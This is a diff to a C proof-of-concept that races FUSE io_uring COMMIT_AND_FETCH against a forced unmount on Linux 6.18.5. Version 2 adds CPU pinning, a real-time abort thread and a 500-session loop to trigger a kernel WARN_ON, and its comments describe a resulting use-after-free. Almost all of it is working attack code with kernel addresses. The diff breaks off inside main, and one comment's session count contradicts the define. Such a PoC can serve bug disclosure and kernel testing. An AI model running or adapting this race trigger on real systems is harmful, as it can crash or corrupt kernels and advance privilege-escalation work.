@@ -1,41 +1,32 @@
 /*
- * fuse_uring_race.c — commit_fetch vs teardown race PoC
+ * fuse_uring_race.c — commit_fetch vs teardown race PoC v2
  *
  * Kernel: 6.18.5 | CONFIG_FUSE_IO_URING=y
  * Requires: echo 1 > /sys/module/fuse/parameters/enable_uring
  * Run as root: ./fuse_uring_race
  *
- * PROTOCOL (from kernel source fs/fuse/dev_uring.c + disassembly)
- * ────────────────────────────────────────────────────────────────
- * 1. REGISTER SQE (cmd_op=1)
- *      ↳ kernel stores cmd ptr in ent->cmd, adds ent to queue->entry_list
- *      ↳ deferred: no immediate CQE
- * 2. FUSE op arrives → fuse_uring_task_to_queue(ring) maps current CPU to qid
- *      ↳ if queue[qid].entry_list is non-empty: dispatch immediately
- *      ↳ fuse_in_header written to iov[0].iov_base (in_buf[qid])
- *      ↳ io_uring_cmd_done(register_cmd, 0) → CQE on REGISTER SQE (res=0)
- * 3. Daemon reads fuse_in_header from in_buf[qid], gets commit_id = ih->unique
- * 4. Daemon writes fuse_out_header+body to out_buf[qid]
- * 5. COMMIT_AND_FETCH SQE (cmd_op=2, commit_id = unique, qid = same queue)
- *      ↳ kernel: fuse_request_find(queue+0x80, commit_id) → finds req
- *      ↳ asserts req->ring_ent->state == 4 (FRRS_USERSPACE)
- *      ↳ commits response, re-arms entry for next op
+ * v2: multi-session loop (N_SESSIONS=200), CPU affinity (CPU_CAF/CPU_ABORT),
+ *     SCHED_FIFO abort thread, immediate abort trigger via abort_ready flag,
+ *     max FUSE op rate (no child sleep).
  *
- * QUEUE ROUTING (confirmed by disassembly of fuse_uring_task_to_queue):
- *      fuse_uring_task_to_queue(ring) uses current->thread_info.cpu % nr_queues
- *      nr_queues = num_online_cpus() at ring creation time = 4 on this system
- *      → MUST register one REGISTER SQE per queue (qid=0..nr_queues-1)
- *      → each queue needs its own in_buf / out_buf
+ * RACE TARGET: SMP parallel execution on CONFIG_PREEMPT_NONE kernel
+ * ─────────────────────────────────────────────────────────────────
+ * CPU 0 (CAF thread):
+ *   (a) 0x81701cc4: movzbl 0xa4(%r13),%eax  — reads abort flag WITHOUT spinlock
+ *   (b) 0x81701cde: call spin_lock           — acquire queue spinlock (memory barrier)
+ *   (c) 0x81701d31: cmpl $0x4,0x30(%rbx)   — check state==4 under spinlock
+ *   (d) 0x81701d39: jne 0x81701e86          — ud2/WARN_ON if state != 4
  *
- * RACE TARGET (confirmed ud2 at 0xffffffff81701e86)
- * ─────────────────────────────────────────────────
- * fuse_uring_stop_list_entries (teardown, acquires queue+0xc spinlock):
- *   if ring_ent->state == FRRS_USERSPACE (4): transitions 4→5 (FRRS_STOPPED)
- *   does NOT remove req from queue->req_hash (queue+0x80)
+ * CPU 1 (abort thread, concurrently):
+ *   fuse_uring_abort_end_requests (0x817022d3): queue+0xa4 = 1  (NO spinlock)
+ *   fuse_uring_stop_list_entries:  acquire spinlock, state = 5, release
  *
- * fuse_uring_commit_fetch (COMMIT_AND_FETCH handler, same spinlock):
- *   fuse_request_find(queue+0x80, commit_id) → finds req (still in hash)
- *   cmpl $0x4, ring_ent->state → jne ud2  ← if teardown already ran: UD2
+ * Race: CPU 0 reads abort flag=0 at (a), then CPU 1 writes flag=1 AND sets
+ * state=5 (under spinlock) before CPU 0 reaches (b). CPU 0 acquires spinlock
+ * at (b), sees state=5 → jne fires → ud2 (WARN_ON) at 0x81701e86.
+ * Recovery: spin_unlock → fuse_req->error=-EPROTO → fuse_request_end → -EPROTO CQE.
+ * Double fuse_request_end (from both recovery and stop_list_entries second loop)
+ * → double fuse_put_request → use-after-free on freed fuse_req slab.
  *
  * Compile: gcc -O2 -Wall -o fuse_uring_race fuse_uring_race.c -lpthread
  */
@@ -62,23 +53,27 @@
 #include <linux/time_types.h>
 
 /* -----------------------------------------------------------------------
+ * Configuration
+ * ----------------------------------------------------------------------- */
+#define N_SESSIONS   500    /* outer loop iterations                          */
+#define CAF_LIMIT   50000   /* max CAF iterations per session (safety cap)    */
+#define ABORT_DELAY_MS 50   /* ms after CAF loop starts before abort fires   */
+#define CPU_CAF      0      /* main/CAF thread CPU                            */
+#define CPU_ABORT    1      /* abort thread CPU — must differ from CPU_CAF    */
+
+/* -----------------------------------------------------------------------
  * FUSE io_uring protocol constants
  * ----------------------------------------------------------------------- */
-
-#define FUSE_OVER_IO_URING              (1u << 9)   /* bit 9 of flags2 */
+#define FUSE_OVER_IO_URING              (1u << 9)
 #define FUSE_IO_URING_CMD_REGISTER          1
 #define FUSE_IO_URING_CMD_COMMIT_AND_FETCH  2
-
-/* user_data for REGISTER SQEs: (REGISTER_BASE << 8) | qid */
 #define REGISTER_BASE  0x5555ULL
-#define REGISTER_TAG   (REGISTER_BASE << 8)   /* 0x555500 — lower byte = qid */
-/* user_data tag for COMMIT_AND_FETCH SQE */
+#define REGISTER_TAG   (REGISTER_BASE << 8)
 #define CAF_TAG        0xdeadULL
 
 /* -----------------------------------------------------------------------
  * Minimal io_uring (no liburing)
  * ----------------------------------------------------------------------- */
-
 struct uring {
     int      fd;
     uint32_t sq_entries, cq_entries;
@@ -150,19 +145,8 @@ static int uring_submit(struct uring *u, int n)
 
 /*
  * Block until one CQE arrives or timeout_ms elapses.
- *
- * CRITICAL: must use min_complete=1, NOT 0.
- *
- * fuse_uring_send_in_task is scheduled as io_uring task work via
- * __io_uring_cmd_do_in_task when a FUSE op is dispatched to the ring.
- * io_cqring_wait only processes pending task work in the wait loop —
- * it returns immediately at "events >= min_events" when min_events=0
- * (0 events are always available), never reaching the task_work check.
- * min_complete=1 forces the wait loop where task work is drained.
- *
- * IORING_ENTER_EXT_ARG + struct io_uring_getevents_arg provides the
- * deadline so we never block indefinitely when the child's stat() goes
- * to /dev/fuse fallback rather than the ring.
+ * min_complete=1 forces io_cqring_wait into the task-work drain loop —
+ * required because fuse_uring_send_in_task is posted as task work.
  */
 static int32_t uring_poll_cqe(struct uring *u, int timeout_ms,
                                uint64_t *user_data_out)
@@ -177,7 +161,6 @@ static int32_t uring_poll_cqe(struct uring *u, int timeout_ms,
         .pad        = 0,
         .ts         = (uint64_t)(uintptr_t)&ts,
     };
-
     syscall(SYS_io_uring_enter, u->fd, 0, 1,
             IORING_ENTER_GETEVENTS | IORING_ENTER_EXT_ARG,
             &arg, sizeof(arg));
@@ -187,8 +170,7 @@ static int32_t uring_poll_cqe(struct uring *u, int timeout_ms,
     if (h != t) {
         uint32_t idx = h & *u->cq_mask;
         int32_t  res = u->cqes[idx].res;
-        if (user_data_out)
-            *user_data_out = u->cqes[idx].user_data;
+        if (user_data_out) *user_data_out = u->cqes[idx].user_data;
         __atomic_store_n(u->cq_head, h + 1, __ATOMIC_RELEASE);
         return res;
     }
@@ -196,10 +178,10 @@ static int32_t uring_poll_cqe(struct uring *u, int timeout_ms,
 }
 
 /* -----------------------------------------------------------------------
- * cmd_req layout in the 128-byte SQE (both REGISTER and COMMIT_AND_FETCH)
+ * cmd_req layout in 128-byte SQE:
  *   sqe+48 = cmd[0]  = flags     (u64)
- *   sqe+56 = cmd[8]  = commit_id (u64)  ← kernel reads from sqe+0x38
- *   sqe+64 = cmd[16] = qid       (u32)  ← kernel reads from sqe+0x40
+ *   sqe+56 = cmd[8]  = commit_id (u64)
+ *   sqe+64 = cmd[16] = qid       (u32)
  * ----------------------------------------------------------------------- */
 struct fuse_uring_cmd_req {
     uint64_t flags;
@@ -209,16 +191,19 @@ struct fuse_uring_cmd_req {
 };
 
 /* -----------------------------------------------------------------------
- * FUSE daemon state — shared between /dev/fuse thread and main
+ * Session state — one per run_session() call; no inter-session pollution.
  * ----------------------------------------------------------------------- */
+struct sess_state {
+    int          fuse_fd;
+    volatile int daemon_stop;
+    volatile uint32_t neg_flags2;
+    volatile int abort_ready;   /* set 1 by main just before CAF loop */
+    char         mntdir[64];
+};
 
-static int          gfuse_fd     = -1;
-static volatile int gdaemon_stop = 0;
-static volatile uint32_t gneg_flags2 = 0;
-static volatile int gdaemon_getattr_count = 0;  /* counts GETATTRs via /dev/fuse */
-static volatile int gdaemon_lookup_count  = 0;  /* counts FUSE_LOOKUP via /dev/fuse */
-static volatile int gdaemon_default_count = 0;  /* counts any unhandled ops via /dev/fuse */
-
+/* -----------------------------------------------------------------------
+ * fuse_send — write FUSE response to /dev/fuse fd
+ * ----------------------------------------------------------------------- */
 static void fuse_send(int fd, uint64_t unique, int err,
                       const void *body, size_t blen)
 {
@@ -231,12 +216,18 @@ static void fuse_send(int fd, uint64_t unique, int err,
     writev(fd, iov, body ? 2 : 1);
 }
 
+/* -----------------------------------------------------------------------
+ * FUSE daemon — handles FUSE_INIT (negotiates FUSE_OVER_IO_URING),
+ * FUSE_GETATTR, FUSE_LOOKUP, FUSE_STATFS, and default ops.
+ * Reads s->daemon_stop to exit cleanly when the session ends.
+ * ----------------------------------------------------------------------- */
 static void *fuse_devfuse_daemon(void *arg)
 {
-    int fd = *(int *)arg;
+    struct sess_state *s = arg;
+    int fd = s->fuse_fd;
     char buf[1 << 17];
 
-    while (!gdaemon_stop) {
+    while (!s->daemon_stop) {
         ssize_t n = read(fd, buf, sizeof buf);
         if (n <= 0) break;
         struct fuse_in_header *h = (struct fuse_in_header *)buf;
@@ -250,20 +241,14 @@ static void *fuse_devfuse_daemon(void *arg)
             o.minor     = 39;
             o.max_write = 65536;
             o.flags     = in->flags & 0xFFFFFFFFu;
-            if (in->flags & 0x40000000u) {      /* FUSE_INIT_EXT */
+            if (in->flags & 0x40000000u) {
                 o.flags2 = FUSE_OVER_IO_URING;
-                __atomic_store_n(&gneg_flags2, o.flags2, __ATOMIC_RELEASE);
+                __atomic_store_n(&s->neg_flags2, o.flags2, __ATOMIC_RELEASE);
             }
             fuse_send(fd, h->unique, 0, &o, sizeof o);
             break;
         }
         case FUSE_GETATTR: {
-            int cnt = __atomic_add_fetch(&gdaemon_getattr_count, 1, __ATOMIC_SEQ_CST);
-            if (cnt <= 5)
-                fprintf(stderr, "  [daemon] FUSE_GETATTR #%d via /dev/fuse"
-                        " nodeid=%llu unique=%llu\n",
-                        cnt, (unsigned long long)h->nodeid,
-                        (unsigned long long)h->unique);
             struct fuse_attr_out o = {0};
             o.attr_valid = 0;
             o.attr.ino   = h->nodeid;
@@ -272,38 +257,26 @@ static void *fuse_devfuse_daemon(void *arg)
             fuse_send(fd, h->unique, 0, &o, sizeof o);
             break;
         }
-        case FUSE_LOOKUP: {
-            int cnt = __atomic_add_fetch(&gdaemon_lookup_count, 1, __ATOMIC_SEQ_CST);
-            if (cnt <= 10)
-                fprintf(stderr, "  [daemon] FUSE_LOOKUP #%d via /dev/fuse"
-                        " nodeid=%llu unique=%llu\n",
-                        cnt, (unsigned long long)h->nodeid,
-                        (unsigned long long)h->unique);
+        case FUSE_LOOKUP:
             fuse_send(fd, h->unique, -ENOENT, NULL, 0);
             break;
-        }
-        default: {
-            int cnt = __atomic_add_fetch(&gdaemon_default_count, 1, __ATOMIC_SEQ_CST);
-            if (cnt <= 10)
-                fprintf(stderr, "  [daemon] opcode=%u via /dev/fuse #%d"
-                        " nodeid=%llu unique=%llu\n",
-                        h->opcode,
-                        cnt,
-                        (unsigned long long)h->nodeid,
-                        (unsigned long long)h->unique);
-            fuse_send(fd, h->unique, -ENOSYS, NULL, 0);
+        case FUSE_STATFS: {
+            struct fuse_statfs_out o = {0};
+            o.st.blocks = 1000; o.st.bfree = 500;
+            o.st.namelen = 255; o.st.bsize = 4096;
+            fuse_send(fd, h->unique, 0, &o, sizeof o);
             break;
         }
+        default:
+            fuse_send(fd, h->unique, -ENOSYS, NULL, 0);
+            break;
         }
     }
     return NULL;
 }
 
 /* -----------------------------------------------------------------------
- * Ring-based response helper
- *
- * Writes a valid fuse_out_header+body to out_buf (iov[1].iov_base) for
- * the op described by *ih.  The kernel reads this during COMMIT_AND_FETCH.
+ * ring_respond — write fuse_out_header+body to out_buf for a ring-dispatched op.
  * ----------------------------------------------------------------------- */
 static void ring_respond(const struct fuse_in_header *ih, void *out_buf)
 {
@@ -312,80 +285,89 @@ static void ring_respond(const struct fuse_in_header *ih, void *out_buf)
     switch (ih->opcode) {
     case FUSE_GETATTR: {
         struct fuse_attr_out body = {0};
-        body.attr_valid  = 1;
-        body.attr.ino    = ih->nodeid;
-        body.attr.nlink  = 1;
-        body.attr.mode   = (ih->nodeid == 1) ? (S_IFDIR|0755) : (S_IFREG|0644);
-        oh->len   = (uint32_t)(sizeof(*oh) + sizeof(body));
-        oh->error = 0;
+        body.attr_valid = 1;
+        body.attr.ino   = ih->nodeid;
+        body.attr.nlink = 1;
+        body.attr.mode  = (ih->nodeid == 1) ? (S_IFDIR|0755) : (S_IFREG|0644);
+        oh->len    = (uint32_t)(sizeof(*oh) + sizeof(body));
+        oh->error  = 0;
         oh->unique = ih->unique;
         memcpy(oh + 1, &body, sizeof(body));
         break;
     }
     case FUSE_LOOKUP:
         oh->len    = sizeof(*oh);
-        oh->error  = -ENOENT;   /* file doesn't exist — fine, just need a reply */
+        oh->error  = -ENOENT;
         oh->unique = ih->unique;
         break;
     case FUSE_STATFS: {
         struct fuse_statfs_out body = {0};
         body.st.blocks = 1000; body.st.bfree = 500;
         body.st.namelen = 255; body.st.bsize = 4096;
-        oh->len   = (uint32_t)(sizeof(*oh) + sizeof(body));
-        oh->error = 0;
+        oh->len    = (uint32_t)(sizeof(*oh) + sizeof(body));
+        oh->error  = 0;
         oh->unique = ih->unique;
         memcpy(oh + 1, &body, sizeof(body));
         break;
     }
     default:
-        oh->len   = sizeof(*oh);
-        oh->error = -ENOSYS;
+        oh->len    = sizeof(*oh);
+        oh->error  = -ENOSYS;
         oh->unique = ih->unique;
         break;
     }
 }
 
 /* -----------------------------------------------------------------------
- * abort_thread_fn: triggers fuse_abort_conn via umount2(MNT_FORCE).
+ * abort_thread_fn — fires umount2(MNT_FORCE|MNT_DETACH) on CPU_ABORT.
  *
- * Call chain: umount2(MNT_FORCE) → fuse_abort_conn
- *   → fuse_uring_abort_end_requests (0x817022d3): queue+0xa4 = 1  (NO spinlock)
- *   → fuse_uring_stop_queues → fuse_uring_stop_list_entries:
- *       state = 5 under queue+0xc spinlock, req STILL in req_hash.
+ * Pinned to CPU_ABORT to ensure true SMP concurrency with the CAF thread
+ * on CPU_CAF.  SCHED_FIFO priority 50 ensures it runs immediately when
+ * abort_ready is seen, without being preempted by normal tasks.
  *
- * TOCTOU race target in fuse_uring_commit_fetch:
- *   (a) 0x81701cc4: movzbl 0xa4(%r13),%eax  — reads queue+0xa4 WITHOUT spinlock
- *   (b) 0x81701cde: call spin_lock           — acquire; memory barrier
- *   (c) 0x81701d31: cmpl $0x4,0x30(%rbx)    — check state under spinlock
- *
- * If abort_end_requests runs between (a) and (b):
- *   queue+0xa4 stale=0 in register (passes check), barrier at (b) makes
- *   state=5 visible, (c) sees state!=4 → jne 0x81701e86 (ud2 / WARN_ON).
- *   commit_fetch recovery path returns -EPROTO to caller.
+ * Waits for abort_ready == 1 (set by main just as the CAF loop starts)
+ * so that the abort races the CAF loop from the very first iteration.
  * ----------------------------------------------------------------------- */
 struct abort_args {
-    const char *mntdir;
-    int         delay_ms;
+    const char   *mntdir;
+    volatile int *ready;
+    int           cpu;
+    int           delay_ms;  /* sleep after ready before firing umount2 */
 };
 
 static void *abort_thread_fn(void *arg)
 {
     struct abort_args *a = arg;
-    usleep((useconds_t)a->delay_ms * 1000);
-    printf("[*] abort_thread: umount2(\"%s\", MNT_FORCE|MNT_DETACH)\n",
-           a->mntdir);
-    fflush(stdout);
+
+    if (a->cpu >= 0) {
+        cpu_set_t cs;
+        CPU_ZERO(&cs);
+        CPU_SET(a->cpu, &cs);
+        pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
+    }
+
+    struct sched_param sp = { .sched_priority = 50 };
+    pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
+
+    /* Spin until CAF loop is running */
+    while (!__atomic_load_n(a->ready, __ATOMIC_ACQUIRE))
+        sched_yield();
+
+    /*
+     * Let CAF loop run at full speed for delay_ms before firing abort.
+     * This ensures many CAF iterations are in-flight during the abort so
+     * that P(CPU 0 is in the 14ns movzbl→spin_lock window when CPU 1
+     * writes queue+0xa4) ≈ 14ns / 5µs = 0.28% per session.
+     */
+    if (a->delay_ms > 0)
+        usleep((useconds_t)a->delay_ms * 1000);
+
     umount2(a->mntdir, MNT_FORCE | MNT_DETACH);
-    printf("[*] abort_thread: done\n");
-    fflush(stdout);
     return NULL;
 }
 
 /* -----------------------------------------------------------------------
- * submit_commit_and_fetch — commit a response and arm for next op.
- *
- * commit_id = ih->unique from the FUSE request we just processed.
- * slot_buf  = scratch buffer for internal use (sqe->addr).
+ * submit_caf — build and enqueue a COMMIT_AND_FETCH SQE.
  * ----------------------------------------------------------------------- */
 static void submit_caf(struct uring *u, int fuse_fd,
                        void *slot_buf, uint64_t commit_id, uint32_t qid)
@@ -405,343 +387,342 @@ static void submit_caf(struct uring *u, int fuse_fd,
 }
 
 /* -----------------------------------------------------------------------
- * Main
+ * run_session — one complete mount → race → unmount iteration.
+ *
+ * Returns: 1  = WARN_ON triggered (-EPROTO from CAF)
+ *          0  = clean abort (-ENODEV or timeout), no race
+ *         -1  = setup error (skip to next session)
  * ----------------------------------------------------------------------- */
+static int run_session(int sess_id, int nq, int *total_caf_io)
+{
+    int ret = 0;
 
+    /* All state declared upfront to avoid jumped-over-initialization issues. */
+    struct sess_state s;
+    pthread_t dtid, atid;
+    int dtid_started = 0, atid_started = 0, mounted = 0;
+    struct uring u;
+    void **in_bufs  = NULL;
+    void **out_bufs = NULL;
+    struct iovec (*reg_iovs)[2] = NULL;
+    void *slot_buf = MAP_FAILED;
+    pid_t child = -1;
+    int caf_count = 0;
+    int q;
+
+    memset(&s, 0, sizeof s);
+    memset(&u, 0, sizeof u);
+    u.fd = -1;
+
+    /* 1. Open /dev/fuse */
+    s.fuse_fd = open("/dev/fuse", O_RDWR | O_CLOEXEC);
+    if (s.fuse_fd < 0) { ret = -1; goto cleanup; }
+
+    /* 2. Create mount point and mount */
+    snprintf(s.mntdir, sizeof s.mntdir, "/tmp/fuse_race_%d_%d",
+             (int)getpid(), sess_id);
+    mkdir(s.mntdir, 0755);
+
+    {
+        char opts[256];
+        snprintf(opts, sizeof opts,
+                 "fd=%d,rootmode=40755,user_id=%d,group_id=%d",
+                 s.fuse_fd, (int)getuid(), (int)getgid());
+        if (mount("fuse_race_test", s.mntdir, "fuse", 0, opts) < 0) {
+            ret = -1; goto cleanup;
+        }
+    }
+    mounted = 1;
+
+    /* 3. Start FUSE daemon (handles FUSE_INIT etc. via /dev/fuse) */
+    pthread_create(&dtid, NULL, fuse_devfuse_daemon, &s);
+    dtid_started = 1;
+
+    /* 4. Poll for FUSE_OVER_IO_URING negotiation (up to 50ms) */
+    for (int t = 0; t < 50; t++) {
+        if (__atomic_load_n(&s.neg_flags2, __ATOMIC_ACQUIRE) & FUSE_OVER_IO_URING)
+            break;
+        usleep(1000);
+    }
+    if (!(__atomic_load_n(&s.neg_flags2, __ATOMIC_ACQUIRE) & FUSE_OVER_IO_URING)) {
+        ret = -1; goto cleanup;
+    }
+
+    /* 5. Allocate per-queue in/out buffers */
+    {
+        const size_t in_sz  = 4096;
+        const size_t out_sz = 128 * 1024;
+
+        in_bufs   = calloc(nq, sizeof(void *));
+        out_bufs  = calloc(nq, sizeof(void *));
+        reg_iovs  = calloc(nq, sizeof(*reg_iovs));
+        if (!in_bufs || !out_bufs || !reg_iovs) { ret = -1; goto cleanup; }
+
+        for (q = 0; q < nq; q++) {
+            in_bufs[q]  = mmap(NULL, in_sz,  PROT_READ|PROT_WRITE,
+                               MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
+            out_bufs[q] = mmap(NULL, out_sz, PROT_READ|PROT_WRITE,
+                               MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
+            if (in_bufs[q] == MAP_FAILED || out_bufs[q] == MAP_FAILED) {
+                ret = -1; goto cleanup;
+            }
+            reg_iovs[q][0].iov_base = in_bufs[q];  reg_iovs[q][0].iov_len = in_sz;
+            reg_iovs[q][1].iov_base = out_bufs[q]; reg_iovs[q][1].iov_len = out_sz;
+        }
+
+        slot_buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
+                        MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
+        if (slot_buf == MAP_FAILED) { ret = -1; goto cleanup; }
+
+        /* 6. Setup io_uring and submit REGISTER SQEs (one per queue) */
+        if (uring_setup(&u, (uint32_t)(nq + 64), IORING_SETUP_SQE128) < 0) {
+            ret = -1; goto cleanup;
+        }
+
+        for (q = 0; q < nq; q++) {
+            memset(in_bufs[q], 0, in_sz);
+            struct io_uring_sqe *sqe = uring_get_sqe(&u);
+            memset(sqe, 0, 128);
+            sqe->opcode    = IORING_OP_URING_CMD;
+            sqe->fd        = s.fuse_fd;
+            sqe->addr      = (uint64_t)(uintptr_t)reg_iovs[q];
+            sqe->len       = 2;
+            sqe->cmd_op    = FUSE_IO_URING_CMD_REGISTER;
+            sqe->user_data = REGISTER_TAG | (uint64_t)(unsigned char)q;
+            struct fuse_uring_cmd_req *r =
+                (struct fuse_uring_cmd_req *)((char *)sqe + 48);
+            memset(r, 0, sizeof(*r));
+            r->qid = (uint32_t)q;
+            uring_submit(&u, 1);
+        }
+
+        /* Check for immediate REGISTER errors */
+        usleep(10000);
+        {
+            uint32_t h = __atomic_load_n(u.cq_head, __ATOMIC_ACQUIRE);
+            uint32_t t2 = __atomic_load_n(u.cq_tail, __ATOMIC_ACQUIRE);
+            int rfail = (int)(t2 - h);
+            __atomic_store_n(u.cq_head, t2, __ATOMIC_RELEASE);
+            if (rfail) { ret = -1; goto cleanup; }
+        }
+
+        /* 7. Fork child: tight stat() loop (no sleep) for max FUSE op rate */
+        char probe[128];
+        snprintf(probe, sizeof probe, "%s/probe", s.mntdir);
+        child = fork();
+        if (child == 0) {
+            struct stat st;
+            while (1) stat(probe, &st);
+            _exit(0);
+        }
+
+        /* 8. Wait for first REGISTER CQE (first FUSE op dispatched to ring) */
+        uint64_t first_ud  = 0;
+        int32_t  first_res = uring_poll_cqe(&u, 2000, &first_ud);
+        if (first_res != 0 ||
+            (first_ud & ~0xffULL) != (REGISTER_BASE << 8)) {
+            ret = -1; goto cleanup;
+        }
+
+        int fired_q = (int)(first_ud & 0xffULL);
+        struct fuse_in_header *ih =
+            (struct fuse_in_header *)in_bufs[fired_q];
+        uint64_t commit_id = ih->unique;
+        if (!commit_id) { ret = -1; goto cleanup; }
+        ring_respond(ih, out_bufs[fired_q]);
+
+        /* 9. Start abort thread — spins on abort_ready, sleeps delay_ms, fires */
+        struct abort_args aargs = {
+            .mntdir   = s.mntdir,
+            .ready    = &s.abort_ready,
+            .cpu      = CPU_ABORT,
+            .delay_ms = ABORT_DELAY_MS,
+        };
+        pthread_create(&atid, NULL, abort_thread_fn, &aargs);
+        atid_started = 1;
+
+        /*
+         * 10. Release abort thread and start CAF loop simultaneously.
+         *
+         * CPU 0 (main): enters kernel via io_uring_enter → commit_fetch:
+         *   (a) movzbl 0xa4(%r13), %eax   — abort flag read (no lock)
+         *   (b) call spin_lock             — acquire + memory barrier
+         *   (c) cmpl $0x4, state           — state check under lock
+         *
+         * CPU 1 (abort, SCHED_FIFO 50): wakes on abort_ready=1, enters kernel
+         * via umount2 → fuse_abort_conn:
+         *   fuse_uring_abort_end_requests: movb $1, queue+0xa4  (no lock)
+         *   fuse_uring_stop_list_entries:  spinlock, state=5, unlock
+         *
+         * Race fires when CPU 0 reads flag=0 at (a) while CPU 1 writes flag=1
+         * and completes stop_list_entries before CPU 0 reaches (b).
+         */
+        __atomic_store_n(&s.abort_ready, 1, __ATOMIC_RELEASE);
+
+        for (int i = 0; i < CAF_LIMIT; i++) {
+            submit_caf(&u, s.fuse_fd, slot_buf, commit_id,
+                       (uint32_t)fired_q);
+            uring_submit(&u, 1);
+            caf_count++;
+
+            uint64_t ud  = 0;
+            int32_t  res = uring_poll_cqe(&u, 500, &ud);
+
+            if (res == -EPROTO) {
+                /*
+                 * commit_fetch WARN_ON recovery path returned -EPROTO:
+                 * ud2 at 0xffffffff81701e86 fired.
+                 * spin_unlock → fuse_req->error=-EPROTO → fuse_request_end
+                 * → io_uring_cmd_done(cmd, -EPROTO) → this CQE.
+                 * A second fuse_request_end from stop_list_entries loop 2
+                 * will also fire → double fuse_put_request → UAF.
+                 */
+                printf("[!] *** WARN_ON TRIGGERED *** sess=%d iter=%d\n",
+                       sess_id, i);
+                printf("    ring_ent->state==5 seen under spinlock in "
+                       "fuse_uring_commit_fetch\n");
+                printf("    ud2 at 0xffffffff81701e86 — check dmesg\n");
+                fflush(stdout);
+                ret = 1;
+                break;
+            }
+            if (res != 0) break;  /* -ENODEV: clean abort; -EAGAIN: timeout */
+
+            /* Next op arrived in in_buf; update commit_id */
+            uint64_t new_id = ih->unique;
+            if (!new_id || new_id == commit_id) {
+                usleep(50);
+                new_id = ih->unique;
+                if (!new_id || new_id == commit_id) break;
+            }
+            commit_id = new_id;
+            ring_respond(ih, out_bufs[fired_q]);
+        }
+    } /* end buffer scope */
+
+cleanup:
+    if (atid_started)  pthread_join(atid, NULL);
+    if (child > 0)     { kill(child, SIGKILL); waitpid(child, NULL, 0); }
+    if (u.fd >= 0)     uring_close(&u);
+
+    if (in_bufs) {
+        for (q = 0; q < nq; q++)
+            if (in_bufs[q] && in_bufs[q] != MAP_FAILED)
+                munmap(in_bufs[q], 4096);
+    }
+    if (out_bufs) {
+        for (q = 0; q < nq; q++)
+            if (out_bufs[q] && out_bufs[q] != MAP_FAILED)
+                munmap(out_bufs[q], 128 * 1024);
+    }
+    free(in_bufs); free(out_bufs); free(reg_iovs);
+    if (slot_buf != MAP_FAILED) munmap(slot_buf, 4096);
+
+    if (mounted) {
+        s.daemon_stop = 1;
+        umount2(s.mntdir, MNT_DETACH);  /* ignore EINVAL if abort already unmounted */
+    }
+    if (s.fuse_fd >= 0) close(s.fuse_fd);
+    if (dtid_started) pthread_join(dtid, NULL);
+    if (s.mntdir[0])  rmdir(s.mntdir);
+
+    if (total_caf_io) *total_caf_io += caf_count;
+    return ret;
+}
+
+/* -----------------------------------------------------------------------
+ * main
+ * ----------------------------------------------------------------------- */
 int main(void)
 {
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
     signal(SIGPIPE, SIG_IGN);
-    signal(SIGCHLD, SIG_DFL);  /* allow waitpid to work */
+    signal(SIGCHLD, SIG_DFL);
 
-    printf("=== fuse_uring commit_fetch vs teardown race PoC ===\n");
-    printf("Kernel: 6.18.5 | CONFIG_FUSE_IO_URING=y\n\n");
+    printf("=== fuse_uring commit_fetch vs teardown race PoC v2 ===\n");
+    printf("Kernel: 6.18.5 | CONFIG_FUSE_IO_URING=y\n");
+    printf("Sessions: %d | CPU_CAF: %d | CPU_ABORT: %d | abort_delay: %dms\n\n",
+           N_SESSIONS, CPU_CAF, CPU_ABORT, ABORT_DELAY_MS);
 
-    /* 0. enable_uring sysctl */
+    /* Enable FUSE io_uring */
     {
         int f = open("/sys/module/fuse/parameters/enable_uring", O_RDWR);
-        if (f < 0) {
-            fprintf(stderr, "[-] Cannot open enable_uring sysctl: %s\n",
-                    strerror(errno));
-            return 1;
-        }
+        if (f < 0) { perror("[-] open enable_uring"); return 1; }
         char val = 0;
         read(f, &val, 1);
-        if (val != 'Y' && val != '1') {
-            write(f, "1", 1);
-            printf("[+] Enabled enable_uring\n");
-        } else {
-            printf("[+] enable_uring already on\n");
-        }
+        if (val != 'Y' && val != '1') write(f, "1", 1);
         close(f);
+        printf("[+] enable_uring active\n");
     }
 
-    /* 1. Open /dev/fuse and mount */
-    gfuse_fd = open("/dev/fuse", O_RDWR | O_CLOEXEC);
-    if (gfuse_fd < 0) { perror("open /dev/fuse"); return 1; }
-
-    char mntdir[64];
-    snprintf(mntdir, sizeof mntdir, "/tmp/fuse_race_%d", (int)getpid());
-    mkdir(mntdir, 0755);
-
-    char opts[256];
-    snprintf(opts, sizeof opts,
-             "fd=%d,rootmode=40755,user_id=%d,group_id=%d",
-             gfuse_fd, (int)getuid(), (int)getgid());
-    if (mount("fuse_race_test", mntdir, "fuse", 0, opts) < 0) {
-        perror("mount fuse"); close(gfuse_fd); rmdir(mntdir); return 1;
-    }
-    printf("[+] Mounted FUSE at %s\n", mntdir);
-
-    /* 2. Start /dev/fuse daemon — handles FUSE_INIT, negotiates FUSE_OVER_IO_URING */
-    pthread_t dtid;
-    pthread_create(&dtid, NULL, fuse_devfuse_daemon, &gfuse_fd);
-
-    /* Wait for daemon to process FUSE_INIT (sent async by mount()). */
-    usleep(200000);
-
-    uint32_t f2 = __atomic_load_n(&gneg_flags2, __ATOMIC_ACQUIRE);
-    if (!(f2 & FUSE_OVER_IO_URING)) {
-        fprintf(stderr, "[-] FUSE_OVER_IO_URING not negotiated (flags2=0x%x)\n", f2);
-        goto cleanup_mount;
-    }
-    printf("[+] FUSE_OVER_IO_URING negotiated (flags2=0x%x)\n", f2);
-
-    /*
-     * 3. Allocate per-queue in/out buffers.
-     *
-     * fuse_uring_task_to_queue(ring) maps current->thread_info.cpu % nr_queues
-     * to a queue.  nr_queues = num_online_cpus() at ring creation = 4 here.
-     * We must register one REGISTER SQE per queue so that FUSE ops from any
-     * CPU find an available entry.  Each queue needs its own in_buf/out_buf
-     * because they are written/read independently.
-     *
-     * REGISTER SQE user_data = REGISTER_TAG | qid so the CQE identifies
-     * which queue's in_buf received the FUSE op.
-     */
-    const int    NQ     = (int)sysconf(_SC_NPROCESSORS_ONLN);
-    const size_t in_sz  = 4096;
